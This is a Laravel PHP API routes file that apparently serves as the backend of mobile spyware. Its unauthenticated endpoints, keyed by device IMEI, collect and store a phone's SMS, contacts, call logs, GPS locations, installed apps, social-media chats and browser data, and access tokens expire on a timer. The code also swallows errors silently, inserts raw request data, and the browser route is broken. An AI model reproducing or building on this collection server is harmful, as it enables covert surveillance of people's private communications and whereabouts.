<?php

use App\Models\Browser;
use App\Models\Contact;
use App\Models\ContactLog;
use App\Models\Sms;
use App\Models\SocialApp;
use App\Models\App;
use App\Models\Phone;
use App\Models\Location;
use App\Models\MobileAccessToken;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

// Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
//     return $request->user();
// });


    Route::post('browsers', function (Request $request) {
        $browserData = (object) $request->json()->all();
        return Browser::create($request->all);
    });
    Route::post('phone',  function (Request $request) {
        try {
            $phone = (object) $request->json()->all();
            Phone::updateOrCreate([
                "imei" => $phone->imei,
            ],[
                "imei" => $phone->imei,
                "model" => $phone->model,
                "readable_name" => $phone->name,
                "client_version" => $phone->version,
                "mobile_access_token" => $phone->token,
            ]);
        }catch(exception $e) {

        }

    });
    Route::post('token_valid', function (Request $request) {
        $result = "false";
        try{
            $tokenObj = (object) $request->json()->all();
            $token = $tokenObj->token;
            $imei = $tokenObj->imei;
            $dbToken = MobileAccessToken::where(["token"=>$token,"active"=>'no'])->doesnthave("phone")->count();
            if($dbToken > 0){
                $result = "true";
            }
            $imeiCount = Phone::where("imei",$imei)->count();
            if($imeiCount > 0) {
                $result = "false";
            }
        }catch(exception $e) {
            $result = "false";
        }
	 
        return response($result,200);
    });
    Route::post('token_active', function (Request $request) {
        $result = "false";
        try{
            $tokenObj = (object) $request->json()->all();
            $token = $tokenObj->token;
            $newToken = MobileAccessToken::where(["token"=>$token,"active"=>"no","new"=>"yes"])->pluck("updated_at");
            if($newToken->count() > 0){
                $tokenDate = $newToken->first();
                if($tokenDate->diffInDays(now(),false) > 3) {
                    MobileAccessToken::updateOrCreate(["token"=>$token],["new"=>"no"]);
                }else{
                    $result = "true";
                }
            }
            $oldToken = MobileAccessToken::where(["token"=>$token,"active"=>"yes","new"=>"no"])->pluck("updated_at");
            if($oldToken->count() > 0) {
                $tokenDate = $oldToken->first();
                if($tokenDate->diffInDays(now(),false) > 30) {
                    MobileAccessToken::updateOrCreate(["token" => $token],["active" => "no"]);
                }else{
                    $result = "true";
                }
            }
        }catch (exception $e) {
            $result = "false";
        }

     
        return response($result,200);
    });
    Route::post('sms', function(Request $request) {
        try{
            $smsDatas = $request->json()->all();
            foreach($smsDatas as $smsData) {
                Sms::create([
                    "imei" => $smsData["imei"],
                    "contact" => $smsData["address"],
                    "type" =>  $smsData["type"],
                    "message" =>  $smsData["msg"],
                    "date" => $smsData["date"],
                ]);
            }
            return response("successful sms entry",200);
        }catch(exception $e) {
            return response("Something Went Wrong",200);
        }

       
    });
    Route::post('contacts', function(Request $request) {
        try{
            $contactDatas = $request->json()->all();
            foreach($contactDatas as $contactData) {
                Contact::updateOrCreate([
                    "imei"  => $contactData["imei"],
                    "name"  =>  $contactData["name"],
                    "phone_number" => $contactData["phoneNumber"]
                ],[
                    "imei"  => $contactData["imei"],
                    "name"  =>  $contactData["name"],
                    "phone_number" => $contactData["phoneNumber"]
                ]);
            }
            return response("Succesful contact entry",200);
        }catch( exception $e) {
            return response("Something Went Wrong",200);
        }

        
    });
    Route::post('call_logs', function(Request $request) {
        try{
            $callLogDatas = $request->json()->all();
            foreach($callLogDatas as $callLogData) {
                ContactLog::updateOrCreate([
                    "imei" =>  $callLogData["imei"],
                    "name"  =>  $callLogData["name"],
                    "phone_number" =>  $callLogData["phoneNumber"],
                    "duration" =>   $callLogData["duration"],
                    "date"  =>  $callLogData["date"],
                    "type" =>  $callLogData["type"],
                ],[
                    "imei" =>  $callLogData["imei"],
                    "name"  =>  $callLogData["name"],
                    "phone_number" =>  $callLogData["phoneNumber"],
                    "duration" =>   $callLogData["duration"],
                    "date"  =>  $callLogData["date"],
                    "type" =>  $callLogData["type"],
                ]);
            }
    
            return response("Sucessful Call log entry",200);
        }catch( exception $e) {
            return response("Something Went Wrong",200);
        }
   
    });
    Route::post('location', function (Request $request) {
        try{
            $locationData = $request->json()->all();
            foreach($locationData as $location) {
                Location::create([
                    "imei" => $location["imei"],
                    "longitude" => $location["longitude"],
                    "latitude" => $location["latitude"],
                    "date" => $location["date"]
                ]);
            }
            // Location::insert($locationData);  //insert entire array into db
    
            return response("Successful location entry",200);
	}catch( exception $e) {
            return response("Something Went Wrong",200);
        }
        
    });
    Route::post('apps', function (Request $request) {
        try{
            $appData = (object) $request->json()->all();
            foreach($appData as $app) {
                App::updateOrCreate([
                    'name'=>$app["name"], 
                    'imei' =>$app["imei"]
                ],[
                    'name'=>$app["name"],
                    'imei' =>$app["imei"]
                ]);
            }
            return response("Successful app entry",200);
        }catch( exception $e) {
        
            return response("Something Went Wrong",200);
        }
        
        
    });
    Route::post('social_media',function(Request $request) {
        try{
            $socialData = $request->json()->all();
            SocialApp::insert($socialData);
            // SocialApp::create([
            //     "imei"=>$socialData->imei,
            //     "contact"=>$socialData->contact,
            //     "type"=>$socialData->type,
            //     "message"=>$socialData->message,
            //     "platform"=>$socialData->platform,
            //     "date"=>$socialData->date
            //     ]);
            return response("Successful chat message entry",200);
        }
        catch( exception $e) {
            return response("Something Went Wrong",200);
        }
       
    });



